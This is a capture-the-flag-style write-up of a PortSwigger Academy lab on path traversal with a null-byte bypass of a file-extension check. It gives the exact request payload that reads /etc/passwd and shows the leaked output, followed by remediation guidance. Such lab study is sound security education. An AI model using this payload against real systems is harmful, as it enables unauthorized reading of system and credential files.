# File path traversal, validation of file extension with null byte bypass

**Category:** Path traversal
**Level:** Practitioner
**Mechanism:** Null byte (`%00`) extension-check bypass
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

---

## Vulnerability

Path traversal in the product-image endpoint. The application validates that the
`filename` **ends with** an allowed image extension (e.g. `.jpg`). A null byte (`%00`)
terminates the string early at the filesystem layer, so the path can point at
`/etc/passwd` while still carrying a trailing `.jpg` to satisfy the extension check.

## Reconnaissance & Exploitation

Images load via `GET /image?filename=32.jpg`; the app requires an image extension at
the end. A plain `../../../etc/passwd` fails the extension check. The bypass appends a
null byte followed by an allowed extension: everything the validator sees ends in
`.jpg`, but the file API stops reading at the `%00`, so it opens `/etc/passwd`.

```
validator reads:   ../../../etc/passwd%00.jpg   → ends in ".jpg" → passes
filesystem reads:  ../../../etc/passwd          → %00 truncates the string here
```

```http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0a650074045776af80f258e900db0022.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

Lab solved — `/etc/passwd` retrieved. The validator and the file API disagree on where
the string ends: the check sees the `.jpg` suffix, the OS-level call stops at the null
byte. Same check/use mismatch as the other bypasses, here across the null terminator.

## Impact

Arbitrary file read with the web process's privileges — account enumeration via
`/etc/passwd`, plus source, config, secrets and keys. The extension allowlist gives a
false sense of safety: a trailing-suffix check is trivially defeated when a lower layer
interprets the string differently (null-byte truncation, and historically double
extensions).

## Remediation

- Validate the **canonical resolved path**, not the string's suffix: resolve with
  `realpath` and confirm it stays inside the base directory. An extension check is not a
  containment check.
- Reject null bytes and other control characters in filenames outright; strip or fail on
  `%00`.
- Use a modern runtime/language where strings are not null-terminated at the file API
  (this specific trick dies there), but never rely on that alone — validate the
  destination.
- Best: map an opaque ID to a known file instead of accepting a path.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory); CWE-158 (Improper Neutralization of Null Byte)

## Notes

- `%00` is the null terminator: in C-style string handling (old PHP, some native file
  APIs) it marks end-of-string, so anything after it is ignored by the OS call but still
  seen by a higher-level validator.
- Recurring theme across this whole category: validating **one end** of the input
  (start-of-path, or extension-at-end) is weak — the fix is always to validate the
  canonical destination the path resolves to.
- This trick is mostly dead in modern languages, but still appears in legacy stacks,
  firmware and appliances.